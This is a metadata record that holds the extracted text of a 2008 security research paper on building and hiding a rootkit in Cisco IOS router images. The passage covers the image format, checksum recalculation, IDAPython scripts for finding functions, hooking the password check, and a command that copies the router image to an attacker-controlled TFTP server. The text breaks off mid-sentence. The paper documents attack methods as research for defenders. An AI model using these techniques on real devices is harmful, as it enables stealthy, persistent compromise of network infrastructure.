{
    "id": "568f3c7d-29a4-46dd-a2a1-276be1fd9de3",
    "created_at": "2022-10-25T16:48:15.032541Z",
    "updated_at": "2025-03-27T02:08:40.312569Z",
    "deleted_at": null,
    "sha1_hash": "c92a770df6f0b3f4f698da4c84cb3cd32889413d",
    "title": "",
    "authors": "",
    "file_creation_date": "2008-06-05T15:35:36Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 166571,
    "plain_text": "CORE Security Technologies\n\n# Killing the myth of Cisco IOS rootkits:\n DIK (Da Ios rootKit)\n\nSebastian 'topo' Muñiz\n\nMay 2008\n\n## Abstract\n\nRootkits are very common in most operating systems, including popular\nWindows, Linux and Unix software, or any variant of those systems,\nhowever they are rarely found in embedded OSes.\n\nThis is due to the fact that most of the time embedded OSes have\nclosed source code, with the internals of the software unknown to the\npublic, making the reverse engineering process harder than usual.\n\nIn real life, it's very common that once an attacker takes control of\na system, he or she will want to maintain access to it, and in an\nattempt to keep those actions undetected a rootkit will be installed.\n\nThe rootkit seizes control of the entire OS running on the\ncompromised device by hiding files, processes and network\nconnections, and allowing unauthorized users to act as system\nadministrators -- while retaining its stealth capabilities and hiding\nthe attacker's presence.\n\nThis paper demonstrates that a rootkit with those characteristics can\neasily be created and deployed for a closed source OS like Cisco IOS\nand run hidden from system administrators surviving most, if not all,\nof the security measures that can be deployed by experts in the\nfield.\n\nAs a proof of this theory, several different techniques for infecting\nan IOS target will be described, including image binary patching.\n\nFrom a practical point of view, one of these techniques will be\nimplemented using a set of Python[1] scripts that provide the\nnecessary methods to insert a generic rootkit implementation written\nin the C programming language-- called DIK (Da IOS Rootkit)- into the\ntarget IOS.\n\nPage 1 of 37\n\n\n-----\n\n## Introduction\n\nThe case of Cisco IOS (formerly known as the Internetwork Operating\nSystem) is unique because it is likely the most widely deployed\nrouting OS running on the entire Internet and a fundamental component\nof mission critical networking operations in almost every\norganization.\n\nNetwork devices are vital to those operations, and sensitive data\nflows through them every second, making them an extremely strategic\nlocation for attackers to place rootkits to gather information from a\ntarget.\n\nSystem administrators need to be prepared for the emergence of these\ntypes of threats because the attacks could lead to serious exploits,\nincluding data breaches, before they ever realize that something is\ngoing on.\n\nSecurity measures are typically undertaken to detect any abnormal\noperations on Cisco devices, but sometimes those measures may not be\nenough to detect advanced rootkits. These efforts may only unveil\nhigh-level rootkits such as a TCL script (only recent versions of IOS\nsupport TCL as a scripting language), or device reconfiguration\nexecuted via startup-config file to alter routes, packet handling,\netc. These high-level rootkits are comparable to user-mode rootkits\nin general purpose operating systems such as Windows, Linux and OS X.\n\nOnly a small percentage of all system administrators perform periodic\nsecurity audits on their organizations’ network infrastructure to\ndetect for potential system compromise.\n\nThese audits may include (but are not limited to) verifying router\nlogs, checking external logs that were set by the router when a user\nlogged-in or changed the device’s configuration, or even by\ndownloading the running IOS image to compare its checksum with a\npreviously calculated value from the original IOS image file.\n\nTo conduct any of these actions, the system administrator implicitly\nrelies on IOS internal functions and trusts the integrity of the\nrunning IOS image. If the device is compromised, the logging and\nsyslog functions can be altered to cover the attacker's actions\nmaking the audit completely useless.\n\nPage 2 of 37\n\n\n-----\n\n## Knowing the enemy\n\nOver the years, Cisco has created multiple hardware configurations\n(even using different CPU architectures -- most commonly PowerPC and\nMIPS) with varied software features sets (i.e., wireless, VoIP) to\naddress the needs of its customers.\n\nThis has required that the company also make multiple and unique IOS\nversions available because each iteration demanded a separate build\nprocess to address the specific feature set running on the involved\nhardware. The combination of multiple hardware platforms and feature\nsets has resulted in the availability of several thousands of unique\nIOS images that could potentially run on a given set of devices.\n\nAnother important factor is that IOS was not designed to support\nadditional modules or allow for plug-ins to be loaded.\n\nWith all this in mind, an initial conclusion might be that the\ndevelopment of a generic rootkit that targets IOS might be too\ndifficult, if not impossible, to achieve.\n\nHowever, this paper will demonstrate that this challenge can in fact\nbe easily solved with a generic method that addresses the need to\nmaintain code for multiple architectures and IOS feature sets, or for\nprogramming the rootkit core in different assembly languages.\n\n**IOS Internals**\n\nCisco IOS has a monolithic architecture which runs as a single image\nwith all processes having access to each other’s memory.\n\nNo memory protection is implemented between processes, which means\nthat a bug in an individual process can (and probably will) corrupt\nother processes and compromise system operations, potentially leading\nto a general failure.\n\nAnother characteristic of the Cisco IOS is that its scheduler\nfunction is not preemptive, as its counterparts on other modern OSes\nwould be.\n\nCisco IOS uses run-to-completion priority scheduling, which is an\nimproved FIFO (First-In, First-Out) scheduler, combined with thread\npriorities. This means that when a process is scheduled, it runs\nuntil it decides to relinkish the associated privilege and make a\nsystem call to allow other processes to run on the same priority\nlevel or higher.\n\nPage 3 of 37\n\n\n-----\n\nThese high-priority processes can jump to the head of the line and\nrun quickly on the CPU. If multiple processes are waiting with the\nsame priority, they are processed in the order in which they're\nreceived (just like basic FIFO).\n\nNewer Cisco IOS images are usually made of a 32-bit ELF file running\non a piece of hardware with a RISC processor (most commonly MIPS or\nPowerPC).\n\nIt's important to note that Cisco engineers modified some of the\nvalues from a standard ELF header so that any tool trying to obtain\ninformation from the file will find lots of invalid values, thus\nmaking initial diagnostic a little bit annoying.\n\nPossible image modification techniques to obtain a valid ELF file\nwill be discussed later and also how this is achieved by DIK.\n\n**IOS initial setup on memory**\n\nThis image contains a self-decompressing (SFX) header that unpacks\nthe fully functional IOS code which will be relocated in memory\nduring run-time.\n\nIt is compressed because it contains many strings that occupy\nprecious memory, resources that are needed more all the time with the\ncontinued arrival of newer IOS versions with additional feature sets.\n\nImage decompression and relocation involves several steps which must\nbe understood since the image downloaded from the device is not the\nactual image that runs when the device is powered on. As previously\nnoted, this is merely a file that self-decompresses at run-time to\nexecute the real IOS OS code. So, in order to place a backdoor the\nuncompressed image is needed.\n\nFor that reason, the compressed IOS image is the one that will be\nmanipulated first to unpack it's content, then analyzed as to figure\nout how to insert (binary modify) the backdoor and finally repack the\nimage to return in back to the device.\n\nRepacking the image means that its checksums must be recalculated to\nreflect the binary manipulation that has been completed so that it\ncan pass through initializing tests that would forbid the modified\nimage from running on the device when a valid checksum is not found.\n\nAn IOS compressed image has the following structure:\n\nPage 4 of 37\n\n\n-----\n\n+------------------------------+\n|     ELF header      |\n+------------------------------+\n|     SFX code      |\n+------------------------------+ --+\n|   Magic (0xFEEDFACE)   |  |\n+------------------------------+  |\n|  Compressed image length  |  |\n+------------------------------+  | Magic\n|  Compressed image checksum |  | Structure\n+------------------------------+  |\n| Uncompressed image checksum |  |\n+------------------------------+  |\n|  Uncompressed image length |  |\n+------------------------------+ --+\n|               |\n|    Compressed image    |\n|               |\n+------------------------------+\n\nThe magic structure is used by the decompression routine so that it\ncan obtain the values needed for the different checksums that are\ncalculated using the specified lengths expressed in words (4 bytes).\nThis means that if the specified length is 1024, then the value is:\n1024 words x 4 bytes per each word = 4096 bytes\n\nThis structure is also a pointer to the beginning of the compressed\ncode.\n\nOnce the device powers on, it will start the ROM Monitor which will\nperform several steps to load the IOS image and will use the magic\nstructure elements during this process.\n\nThis process involves seven steps:\n\n1. The ROM Monitor will load and position the SFX image at its link\n\naddress in memory (either from a flash boot or a netboot) as the\nELF header specifies. This is when the image file is copied from\nthe file system to the device memory and the main routine is\ninvoked.\n\n2. Now the magic structure is located using the value of a global\n\nvariable called 'edata' that is initialized by the ROM Monitor.\nAt this point, this variable points directly to the structure\ncontaining the values needed to checksum and decompress the\nimage.\n\nPage 5 of 37\n\n\n-----\n\n3. The routine in the SFX image then checks to ensure that enough\n\nmemory is available for decompression using the value of the\nfield 'uncompressed image length' of the magic structure. If\nthere is not enough memory available, then the code returns to\nthe ROM Monitor with a software force reload signal after\ngenerating a message containing the text:\n“Error : memory requirements exceed available memory”.\nAlso remember that the return to the monitor is not intended to\noccur unless a reload was initiated.\n\n4. A checksum of the compressed image is calculated and the result\n\nis compared against the value stored in the file to ensure that\nno corruption has occurred. The checksum algorithm is very\nsimple and works using the length field value (either the\ncompressed or the uncompressed) from the magic structure.\n\nThe code that calculates the checksum is similar to the\nfollowing:\n\nint nwords = compressed_size / sizeof(ulong);\n\nunsigned long sum  = 0; // contains the checksum result\n\nunsigned long val  = 0; // temporary value\n\nunsigned char* bufp = (uchar*) ptrData; // pointer to\n\n// data to verify\nwhile (nwords--) {\n\nval = *bufp++;\nsum += val;\nif (sum < val) { /* There was a carry */\n\nsum++;\n}\n}\n\n5. The compressed code is then moved to a higher memory location\n\nand the BSS section is initialized with zeros.\n\n6. The decompression process takes place. The decompressed image is\n\nalso checksummed to ensure there was no corruption and if it\nfails, then a message containing the text “Error: uncompressed\nimage checksum is incorrect” is displayed. Also, the size of the\ndecompressed image is compared against the value stored in the\nheader to ensure that was completely successful.\n\n7. Using an internal function called copy_and_launch(), the code\n\nrelocation phase takes place moving the image to the specified\n\nPage 6 of 37\n\n\n-----\n\naddress in the ELF file header so the image entry point is\ncalled. It's worth mentioning that if this call returns, then\n“Error: copy_and_launch() returned” is displayed.\n\n## The beginning of the end\n\nThe rootkit will locate certain key (and usually low-level) functions\nof the OS that is being compromised to perform a binary patch and\nthen hook them.\n\nThese functions are strategic code locations that will allow the\nattacker to intercept data of interest.\n\nThey could be grouped by their functionality:\n\n  - System Login\n\n  - Authentication and authorization\n\n  - File system access\n\n  - Networking operations\n\n  - Process handling\n\n  - Information display\n\n  - System Logs\n\n  - Debugging and core dumps\n\nThis paper will demonstrate how to identify only some of those\nfunctions because the identification procedure is the same for all of\nthem.\n\nIn the case of a closed source OS like Cisco IOS, the first thing to\ndo is identify the code that carries out the involved functions.\n\nIn order to perform an analysis, it is necessary to obtain the image\nrunning on the target device. This can be easily done by configuring\nan FTP or TFTP server on a machine controlled by an attacker, and\nthen issuing a copy command on the Cisco device command line like the\nfollowing:\n\nRouter# copy flash:c2691-i-mz.123-22.bin tftp://172.23.1.12/c2691-i-mz.123-22.bin\nVerifying checksum for `c2691-i-mz.123-22.bin' (file # 1)...[OK]\nWriting test\n\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\nPage 7 of 37\n\n\n-----\n\nWith the target IOS image downloaded it's now possible to decompress\nit and then proceed to the analysis phase, modify the binary and\ninfect it.\n\nThough binary patching is not the only way to do this, other possible\ninfection methods will be explained later.\n\n**Chasing the prey**\n\nOnce the file was obtained, a few steps must be followed to be able\nto analyze the IOS image and correctly detect the previously\nmentioned functions:\n\n1. As previously stated, the image inside the device is compressed,\n\nso you must proceed to decompress it. The decompression process\nis the same as for any zipped file so it's also possible to use\nany free unzip utility to do it. Once the image is unpacked the\nscript will checksum it to ensure that there was no corruption.\n\n2. The decompressed image, called C2691-I-.BIN, must be analyzed\n\nusing IDA Pro[3] to obtain crucial information for the rootkit’s\nsurvival. This can take several minutes, even hours, because\nuncompressed IOS image files take up several megabytes\n(especially those versions with advanced features sets).\n\n3. Once IDA finishes, the image won't be completely analyzed\n\nbecause several functions and multiple string references will be\nmissing. To address this problem another script will be used. It\nutilizes IDAPython[4] to automate the function and string\nrecognition process.\n\nThe script performs its task in a two phase process:\n\n   - First it'll look for known segments of CODE type and iterate\nover every instruction aligned to a 4 byte memory boundary.\nIf the instruction is not actually part of a function, then\nthe function is created and IDA takes care of detecting its\nend. The script then moves to the instruction after the end\nof the previously recognized function and tells IDA that this\n\nPage 8 of 37\n\n\n-----\n\nbelongs to a function, and so on. This is done in IDA-Python\nwith a script like this:\n\nclass EnhancedAnalysis:\n\nRESULT_OK  = 0\nRESULT_ERR = 1\nWAS_BREAK  = 2\n\ndef __init__(self):\nself.data_segs = list()\nself.code_segs = list()\n\ndef createUnresolvedFunctions(self):\n\"\"\"\nAnalyze the code section to find every non-function byte and\ncreate a function at that position. This is highly reliable\nbecause CISCO compiler creates one function after another\nand every instruction is aligned to 4bytes because of the\nRISC arch.\n\"\"\"\n\nprint '[+] Processing CODE segments:'\n\n# Iterate through each code segment available\nfor seg in self.code_segs:\ncurr_address    = seg.startEA\ncounter       = 0\ninitial_funcs_qty  = get_func_qty()\nresult       = self.RESULT_OK\n\nprint '  Analyzing \\'%s\\'...' % SegName(seg.startEA),\n\n# Start iteration on every non-function byte until we\n# reach the end of the current working segment.\nwhile curr_address < seg.endEA:\n\n# If 'cancel' button was pressed, stop\n# processing functions.\nif wasBreak():\nresult = self.WAS_BREAK\nprint 'Cancelled'\nreturn\n\n# Get the next address that is not a function\n# recognized by IDA.\n\nPage 9 of 37\n\n\n-----\n\n- With functions correctly detected, every instruction aligned\nto a 4 byte memory address in DATA type segments is then\niterated to recognize every string reference belonging to\nthose functions.\n\nThe script performs additional checks to ensure that the\nvalues at the memory address being analyzed are a string,\ninstead of a reference (pointer) to it.\n\nFor example, in a case where the DATA segment begins at\n0x70610000, the script tries to determine if the value\n0x71617373 is the string “pass” or a reference to the memory\naddress where a string could be stored.\n\nNext is a part of the IDA-Python script that performs those\ntasks:\n\nPage 10 of 37\n\n\n-----\n\nPage 11 of 37\n\n\n-----\n\n# Before converting it to a string or dword, we\n# check segments address space and compare it\n# with the 4 byte value at the current address\n# being processed.\n# This way we can detect any offset to a\n# function or to a string or data in\n# the same segment or a simple string array.\n#\n# Example: It may happen that a string\n# 'abcd' (0x61626364) is detected as an\n# offset if 0x61XXXXXX is a valid segment\n# address, so this would be an error.\n# To avoid this I think we should not only check\n# the first character but the other, too.\ndw_curr_address = get_long(curr_address)\nfor code_seg in self.code_segs:\ncode_seg_end_ea = code_seg.endEA\ntransform_to  = ''\n\nif dw_curr_address != 0xFFFFFFFF:\nif ((dw_curr_address >= seg.startEA) \\\nand (dw_curr_address <= seg.endEA))\\\nor \\\n((dw_curr_address>=code_seg.startEA)\\\nand \\\n(dw_curr_address <= code_seg.endEA)):\n\ntransform_to = 'dword'\nbreak # Do not continue checking\nelse:\ntransform_to = 'string'\nelse:\ntransform_to = 'string'\nelse:\ntransform_to = 'dword'\n\nif transform_to == 'string':\n# We did not use MakeStr because of a bug in\n# IDAPython and because we can't set the\n# 3rd parameter.\nif make_ascii_string(curr_address, 0, ASCSTR_C):\nnew_str_counter += 1\nelse:\nMakeDword(curr_address)\n\nPage 12 of 37\n\n\n-----\n\nAfter a few minutes, all strings that are not recognized by IDA\nPro will be created and several new strings will be found. The\nfollowing is the script's output to the IDA message console:\n\nInitiating enhanced CISCO IOS analysis...\n\n[+] Found CODE segment '.text' at 0x80008000\n\n[+] Found DATA segment '.rodata' at 0x80CEA424\n\n[+] Found DATA segment '.data' at 0x81145AB0\n\n[+] Found DATA segment '.sdata' at 0x812A3AF8\n\n[+] Processing CODE segments:\nAnalyzing '.text'... Done\n\n[+] Created a total of 18204 new functions\n\n[+] Processing DATA segments:\nAnalyzing '.rodata'... Done\nAnalyzing '.data'... Done\nAnalyzing '.sdata'... Done\n\n[+] Converted 176773 strings\n\n[+] Enhanced analysis took 7.03 minutes\n\nAs you can see, once the script finishes, the image is ready to use\nand can be examined by the attacker to gain knowledge of Cisco IOS\ninternals using all the new information acquired by IDA.\n\nSuccessful IOS image analysis is very important because it contains\nplenty of debugging strings to provide verbose information to the\nsystem administrator about the OS state. Those debug strings will be\nused as a starting point to detect the key functions of the OS and\nbecause it's known for sure that these strings remain the same across\nmultiple IOS versions.\n\nPage 13 of 37\n\n\n-----\n\n**Resistance is futile**\n\nSome of those interesting functions might not be located because of\ncompiling issues or it might not be possible to retrieve any string\nreferences in some cases simply because they do not use any strings\nat all.\n\nAs stated before, the IOS contains plenty of strings, most of which\noffer debugging information, and others that merely output commonly\nseen messages to the user terminal. These messages can be located in\nfunctions close to those that we are looking for, and, knowing that\nthey will not be moved by the compiler, it's possible to try to find\nthese 'neighbor' functions and then identify the ones relevant to the\nrootkit functionality and hook them.\n\nFunction reordering is common on modern compilers, but this is not\nthe case in the compiler used by Cisco so our approach is reliable in\nthis scenario. IDA Python will be used to help us to locate the\nnecessary strings and the code references attached to them. For this\npurpose, a class was created inside of the script that will perform\nthe binary patch. This class will take a list of predefined strings\nand will perform the search operation returning to a list of crossreferences (IDA's xrefs) to those strings.\n\nThe memory location referencing those strings is the memory location\nof the involved functions, so now it's just a matter of asking IDA\nabout the beginning of the function to know where a jump to the\nrootkit code can be inserted.\n\nThe location of neighbor functions is not necessarily immediate to\nthe one needed for the rootkit, there could be another function\nwithout any string references separating them, but this approach will\nstill succeed.\n\nTo illustrate the functions recognition method a functions layout\nwill be shown next as an example:\n\nPage 14 of 37\n\n\n-----\n\n+------------------------------+\n|    neighbor_minus_2    | <- uses a unique string.\n+------------------------------+\n|    neighbor_minus_1    |\n+------------------------------+\n|               |\n|      chk_pass      | <- function of interest\n|               |   for the rootkit\n+------------------------------+\n|    neighbor_plus_1    |\n+------------------------------+\n|    neighbor_plus_2    |\n+------------------------------+\n\nIn the case that the function chk_pass() doesn't contain any string\nbut the function neighbor_plus2() does, the following steps must be\naccomplished to locate the chk_pass() function:\n\n1. Iterate through the list of strings on IDA to search for the\n\nstrings referenced by function neighbor_plus2(). In IDA-Python\nthis can be done by a simple function like this:\n\ndef funcString(string_to_find):\n\"\"\"Function to find the specified string among all\"\"\"\n\n# Refresh the list of IDA strings\nrefresh_strlist(0, 0xFFFFFFFF)\n\n# Store information about the specified string\nstring_info = string_info_t()\n\n# Iterate through every string available\nfor i in range(get_strlist_qty()):\n# Get the current string item to compare against the list\nget_strlist_item(i, string_info)\n\nif len(string_to_find) == string_info.length:\n# Found flag\nstring_missmatch = False\n\n# Byte-to-byte comparison is quicker that entire string\nfor j in range(string_info.length):\nif ord(string_to_find[j]) != Byte(string_info.ea+j):\nstring_missmatch = True\n\nPage 15 of 37\n\n\n-----\n\n2. Obtain a list of every data reference (IDA calls it 'dref' -- a\n\nreference to a data in the specified memory address) to the\nstring used to identify the function chk_pass() with the\nfollowing code:\n\ndef getDataRefs(string_address):\n# Store the list of data references to the specified string\nstring_drefs = list()\n\nref = get_first_dref_to(string_address)\n\nwhile ref != BADADDR:\n# Check if list is empty to avoid further validations\nif len(string_drefs):\n# Check if previous ref is the same.\n# Explanation is in the text bellow !!!\nif (string_drefs[-1] + 4) == ref:\ncontinue\nelse:\n# Add the first reference to the list\nstring_drefs.append(ref)\n\nstring_drefs.append(ref)\nref = get_next_dref_to(string_address, ref)\n\nreturn string_drefs\n\nKeep in mind that in RISC architectures the memory reference\nvalues are loaded using two instructions because a 32-bit memory\naddress cannot be referenced directly using only 4 byte\ninstructions. This way two data references will be issued (one\nto refer to the upper 2 bytes, and another for the lower 2\nbytes) that still belong to the same source code.\n\nDue to the fact that the compiler puts those two instructions\ntogether, a check is issued to verify if the last appended\nreferenced address, plus 4, is equal to the current reference.\nIt will happen that IDA will detect LA (Load Address) macro\n\nPage 16 of 37\n\n\n-----\n\ninstruction in MIPS. Do not confuse this with PowerPC LA (Load\nAddress) instruction, which is a macro for the ADDI instruction.\n\nAn example of string pointer load on PowerPC disassembly\nfollows:\n\n.text:801C37D0 lis   %r6, aVerifyPass@h # \"Verify pass\"\n.text:801C37D4 addi  %r6, %r6, aVerifyPass@l # \"Verify pass\"\n\nThe LIS (Load Immediate Shifted) loads the upper 2 bytes of the\nmemory address of the string in register R6 while the\ninstruction ADDI (Add Immediate) loads the lower 2 bytes to R6.\nNow the register contains the memory address of the string.\n\nIn an IOS image running on MIPS architecture, the following\ndisassembly code is obtained:\n\n.text:60201084 la   $a3, aVerifyPass # \"Verify pass\"\n\nThe LA (Load Address) macro instruction is recognized by IDA but\nit is not a real instruction because it's a macro wrapping the\nfollowing code:\n\n.text:60201084 lui   $a3, 0x6118 # \"Verify pass\"@h\n.text:60201088 addiu  $a3, 0x7334 # \"Verify pass\"@l\n\nThe first instruction is LUI (Load Upper Immediate) and loads\nthe 2 upper bytes into register A3 and then the instruction\nADDIU (Add Immediate Unsigned) adds the 2 lower bytes making\nregister A3 a pointer to the memory address containing the\nstring.\n\n3. Now the memory address containing the code that references the\n\nstring in function neighbor_minus_2() is known. It's also known\nthat the function chk_pass() is two functions away from the\nfunction neighbor_minus_2() so it can be resolved easily using\nIDA-Python:\n\n# xref_found contains the address of the code referencing\n# the string that was previously obtained.\n\nfn_neighbor_minus_2 = get_func(xref_found)\nfn_neighbor_minus_1 = get_next_func(fn_neighbor_minus_2.startEA)\nfn_chk_pass     = get_next_func(fn_neighbor_minus_1.startEA)\n\nPage 17 of 37\n\n\n-----\n\nWith those easy steps, the memory address of the first instruction\npointing to the function prologue will be obtained.\n\nThe function prologue will be replaced by a hook to jump to our code\nbut this will be explained in detail later.\n\nAlso note that the neighbor function could be located at any distance\nor from any direction (before or after) from the function chk_pass()\nso this approach will still work because the compiler puts one\nfunction after another as declared in the source code.\n\n**Home sweet home**\n\nThe rootkit location must be decided before any image patching takes\nplace (whether it is on the file or at run-time) because the patches\napplied at the beginning of every function will jump to the rootkit\ncode and they must know its memory location.\n\nTaking advantage of IOS memory management protection (or the lack of\nit) rootkit code will be written on the DATA segment by sacrificing a\ndebug string which will almost probably never be used. Cisco IOS has\nplenty of these strings and most of them are common along several\nversions (if not all).\n\nJust in case the system administrator decides to use some IOS feature\nthat requires that string, a NULL character will be written at the\nfirst character to avoid string displaying problems and also to avoid\nuser suspicion. To find a specific string, refer to the previous\nsection were IDA-Python is used for this purpose.\n\nThere are several ways to insert the rootkit code in the file and\nthey are all well known for any Linux virus writer because it's\nmainly a standard ELF infection procedure[5][6].\n\nFor example, knowing that every ELF section is aligned to a memory\npage size, one possible technique is to use the unused space between\nsections. This requires section length modifications on the ELF\nheader but this is easy to achieve.\n\nAnother way to infect the image is adding new sections at the end of\nthe file, but this requires extensive ELF header and sections header\ntable modifications.\n\nPage 18 of 37\n\n\n-----\n\nNo detailed explanation will be given about those techniques, and\nonly for the sake of clarity is it mentioned that overwriting an\nexisting string resource in the file is the method chosen because it\ndoesn't require any ELF header manipulations.\n\nThis method is the easiest in this case because IOS images contain\nvery long strings that are rarely used and there is no need to modify\nthe ELF header values because every section and segment remains the\nsame. The downside of this method is that it requires a bigger\nfootprint because of the sacrifice of debug strings which could\ncompromise our rootkit presence on the system.\n\nAs mentioned at the beginning of the paper, the rootkit core will be\nimplemented in plain C so we must compile the rootkit and extract\nfrom it the functions which perform the tasks needed -- without the\nwhole image headers (we will probably setup GCC[7] to crosscompile[8] to PowerPC-ELF or to MIPS-ELF, so ELF file headers must be\navoided).\n\nAfter extracting the rootkit code from the resulting file, a chunk of\nbytes will be obtained and this is the code that will be written over\nthe selected string, but this will be covered in detail later.\n\nIn some cases the DATA segment permissions (in which the string\nresides) need to be changed to RWX (Read-Write-eXecute) because those\nsections were previously used to allocate strings and no code\nexecution capability was required from them.\n\nIn case the attacker preferred to create an additional section in the\nimage file, ELF file header modification or any other operation on\nthe file sections or segments, could be easily done with the PyElf[9]\nlibrary specially created for this project.\n\nIt is also possible to change file section permissions to add EXEC\nusing our PyElf as shown in the following example:\n\nfrom pyelf import Elf\nfrom sections import SHF_EXECINSTR\n\nios_filename = 'C2691-I-.BIN'\nelf = Elf(ios_filename)\n\n# Assuming that section number 3 is '.text'\ndata_sec = elf.sections[3]\nprint '[-] Old flags: %s' % data_sec.getFlagsString()\n\nPage 19 of 37\n\n\n-----\n\nImage manipulation must be done very carefully because it will be\nrelocated after the decompression process and any invalid memory\nreference could lead to an exception resulting in a system crash.\n\nIn the preceding paragraphs, a number of methods to insert the\nrootkit code have been mentioned, but they all have something in\ncommon -- the rootkit code must be addressable from current IOS\nfunctions so the memory address selected to store the code is needed.\n\n**Rootkit address book: Functions to 'call' in it**\n\nSince the method selected to place our rootkit inside the IOS image\nis to overwrite existing strings, the first step is to read the\nrootkit that was previously compiled to extract the necessary code\n(this is achieved using a script mentioned bellow) for the current\narchitecture whether it's MIPS or PowerPC, and write it at the\nselected string location.\n\nOnce this is done, the memory address that points to the end of the\nrootkit code must be stored for further operations on the image.\n\nNext, every function offset inside the precompiled rootkit C code\nmust be known, so when an IOS function is patched to call to its\nrootkit counterpart, the address of the rootkit function must be\ninserted inside the shellcode that will produce the jump.\n\nFor example, when redirecting execution flow from IOS image\nchk_pass() function call to the rootkit counterpart function, the\noffset of the rootkit function inside the entire compiled rootkit\ncode is needed to jump to its location relative to the original IOS\nfunction and then return. If the exact location of the rootkit\nfunction is not known, then most likely an exception will eventually\nbe generated.\n\nA more in-depth explanation will be given later about this issue and\nwhy it's so important. For now, let just focus on obtaining the\n\nPage 20 of 37\n\n\n-----\n\nrootkit code and its function’s offsets and symbols.\n\nTo dump the code disassembly to a file on disk, GCC will be used to\ncompile the rootkit code and then taking advantage of ELF\nmanipulation tools included in the binutils package[10]. A text\noutput will be generated using objdump utility[11] to disassembly the\ncode and obtain a map of it's symbol locations.\n\nNext is a sample output from this tool:\n\nDisassembly of section .text:\n\n01800490 <chk_pass-0x4>:\n1800490:    42 4f 46 5f   bcla-  18,4*cr3+so,465c ; \"BOF_\"\n\n01800494 <chk_pass>:\n1800494:    94 21 ff d0   stwu  r1,-48(r1)\n1800498:    7c 08 02 a6   mflr  r0\n180049c:    93 e1 00 28   stw   r31,40(r1)\n18004a0:    90 01 00 34   stw   r0,52(r1)\n....\n1800508:    7c 08 03 a6   mtlr  r0\n180050c:    83 eb ff f8   lwz   r31,-8(r11)\n1800510:    7d 61 5b 78   mr   r1,r11\n1800514:    4e 80 00 20   blr\n\n01800518 <chk_pass_md5>:\n1800518:    94 21 ff e0   stwu  r1,-32(r1)\n180051c:    7c 08 02 a6   mflr  r0\n1800520:    93 e1 00 18   stw   r31,24(r1)\n1800524:    90 01 00 24   stw   r0,36(r1)\n....\n1800620:    7c 08 03 a6   mtlr  r0\n1800624:    83 eb ff f8   lwz   r31,-8(r11)\n1800628:    7d 61 5b 78   mr   r1,r11\n180062c:    4e 80 00 20   blr\n1800630:    45 4f 46 5f   .long 0x454f465f  ; .ascii \"EOF_\"\n\n01800634 <_start>:\n1800634:    94 21 ff e0   stwu  r1,-32(r1)\n1800638:    93 e1 00 18   stw   r31,24(r1)\n...\n\nThose symbols containing the function names and addresses will be\nparsed by a Python program specially created to return the\nappropriate information. In the addresses 0x1800490 and 0x1800630,\n\nPage 21 of 37\n\n\n-----\n\ntwo ASCII strings can be observed.\n\nThose two strings are marker flags set in the plain C rootkit code\nand used by the scripts to extract the code in between -- which is\nthe rootkit compiled code for the target architecture (whether it's\nMIPS or PowerPC) and of interest to us. This way the unnecessary code\nis left behind and only a small amount of code is kept to be inserted\ninto the IOS image.\n\nThe resulting file containing disassembly code, symbols and opcodes\nfor every instruction will be processed by a Python script giving a\nPython tuple object of the two elements as a result.\n\nThe first element (variable code_indexes) is a Python dictionary\nobject indexed by function name and containing the function’s\nstarting offset as the second element of the tuple. The second\nelement (variable code_instructions) contains a Python list object\nwith every instruction and the corresponding opcode values to write\ninto the selected string of the IOS image. The relation between them\nis the following:\n\ncode_indexes[]            code_instructions()\n+------------------+-------+    +-----------+------------------+\n| Function Name  |Offset |    | Opcode  |   Instruction |\n+------------------+-------+    +-----------+------------------+\n| chk_pass     | 0   |<------>|0x9421ffd0 | stwu r1,-48(r1) |\n|         |    |    |      |         |\n| chk_pass_md5   | 30  |<----+ |  ...(30 items between)... |\n|         |    |   | |      |         |\n| open_file    | 85  |<-+ +->|0x9421ffd5 | stwu r1,-43(r1) |\n|         |    | |   |      |         |\n+------------------+-------+ |   |  ...(55 items between)... |\n|   |      |         |\n+---->|0x7c030378 | mr  r3,r0   |\n|      |         |\n|  ...(more items)...    |\n+-----------+------------------+\n\nAs you can see, the dictionary object called code_indexes uses the\nfunction’s name as its key and the corresponding value is the offset\nto the second object called code_instruction that contains the parsed\noutput with instructions and its opcodes.\n\nThis works either on PowerPC and MIPS platforms because it uses the\noutput of the Python script, which is almost the same for both\narchitectures (the script takes care of small differences on the\noutput).\n\nPage 22 of 37\n\n\n-----\n\n**Code voyeurism and fetishism**\n\nOnce the key functions are found, rootkit insertion will be discussed\nusing a binary patching technique on the IOS image. Once in control\nof the function, it will take different actions based on the\nparameters passed at run-time.\n\nLet's take for example the password-checking function. In this case\nthe rootkit must take control at the beginning of the function (known\nas prologue) to check if the rootkit password was entered. In that\ncase the original password check function won't be executed,\notherwise it will be as if nothing had happened.\n\nThat means that some instructions (architecture dependent) will be\noverwritten at the prologue of the function and stored for further\nusage.\n\nNext is a common function prologue from an IOS running on PowerPC:\n\n.text:803B6434  stwu  %sp, -0x18(%sp) ; create stack\n.text:803B6438  mflr  %r0       ; move ret addr to %r0\n.text:803B643C  stmw  %r30, 0x10(%sp) ; save previous values\n.text:803B6440  stw   %r0, 0x1C(%sp) ; store ret addr on stack\n.text:803B6444  mr   %r31, %r3    ; move params to use\n.text:803B6448  mr   %r30, %r4    ; ...\n.text:803B644C  li   %r0, 0\n.text:803B6450  stw   %r0, 0x18+var_10(%sp)\n\nDue to the nature of the RISC architecture (despite the differences\nbetween MIPS and PowerPC) the return addresses must be stored by the\nfunction prologue because (as a difference to x86) it’s stored in a\nregister called LR (Link Register) instead of in the stack. Saving\nthe return address and registers whose values must prevail intact\nafter the function returns is one of the tasks of the prologue.\n\nIn order to take control of the execution flow, the first instruction\nof the original function of IOS targeted for redirection (in the case\nof PowerPC, the first two instructions for IOS running on MIPS) must\nbe overwritten with a jump to a location with specific shellcode\nwhich was previously selected by replacing a debug string used inside\nthe IOS.\n\nThe instruction that overwrites the function prologue is 